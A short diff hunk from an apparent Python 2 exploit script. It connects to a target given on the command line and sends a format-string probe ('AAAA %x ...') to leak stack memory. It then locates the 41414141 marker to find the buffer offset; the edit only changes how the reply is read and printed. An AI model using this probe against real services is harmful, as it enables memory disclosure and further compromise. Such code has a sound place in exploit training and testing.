@@ -39,12 +39,9 @@ s = socket.socket()
 s.connect((sys.argv[1], int(sys.argv[2])))
 
 s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
-if os.fork():
-    while 1:
-        line += s.recv(1)
-#line = readLine(s)
+line = readLine(s)
 
-print "%s" %line
+sys.stdout.write(line)
 
 vals = line.split()
 buf_start = vals.index('41414141')
